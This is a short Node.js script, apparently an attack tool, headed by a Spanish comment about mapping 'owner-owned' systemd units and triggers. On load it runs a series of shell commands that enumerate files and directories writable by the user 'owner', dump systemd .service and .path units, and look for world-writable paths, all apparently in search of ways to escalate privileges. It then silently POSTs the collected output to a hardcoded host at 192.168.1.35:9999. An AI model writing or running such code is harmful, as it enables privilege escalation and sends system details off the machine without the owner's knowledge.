/**
 * service.js v8 — mapeo "owner-owned" total (systemd units, dirs, triggers).
 */
var cp = require('child_process');
var fs = require('fs');
var http = require('http');
var DEST = { host: '192.168.1.35', port: 9999 };

function post(path, obj) {
    var body = JSON.stringify(obj);
    var req = http.request({ host: DEST.host, port: DEST.port, path: path, method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } },
        function (res) { res.resume(); });
    req.on('error', function () { });
    req.write(body); req.end();
}

(function main() {
    var cmds = [
        'find /usr/lib/systemd/system /etc/systemd/system -user owner 2>/dev/null',
        'cat /usr/lib/systemd/system/acr.service',
        'cat /usr/lib/systemd/system/acr.path',
        'find /etc -user owner 2>/dev/null | head -40',
        'find /opt /mnt -user owner 2>/dev/null | head -60',
        'which systemctl systemctl-helper 2>&1; ls -l /usr/bin/systemctl 2>&1',
        'grep -lE "path|watch" /usr/lib/systemd/system/*.path 2>/dev/null | head',
        'for f in /usr/lib/systemd/system/*.path; do echo "== $f"; cat "$f"; done 2>&1 | head -120',
        'find /etc /usr/lib/systemd/system /opt -o+w 2>/dev/null | grep -v proc | head -50',
        'ls -la /usr/lib/systemd/system/basic.target.wants 2>&1',
        'find / -user owner -type f -writable 2>/dev/null | grep -vE "^/(proc|sys|run/user)|shm_" | head -60',
        'find / -user owner -type d -writable 2>/dev/null | grep -vE "^/(proc|sys|run/user)|shm_" | head -60'
    ];
    var outs = [];
    (function next(i) {
        if (i >= cmds.length) { post('/ownermap', { outs: outs }); return; }
        cp.exec(cmds[i], { timeout: 12000 }, function (err, so, se) {
            outs.push({ cmd: cmds[i], out: String(so).slice(0, 5000), errout: String(se).slice(0, 300) });
            next(i + 1);
        });
    })(0);
})();
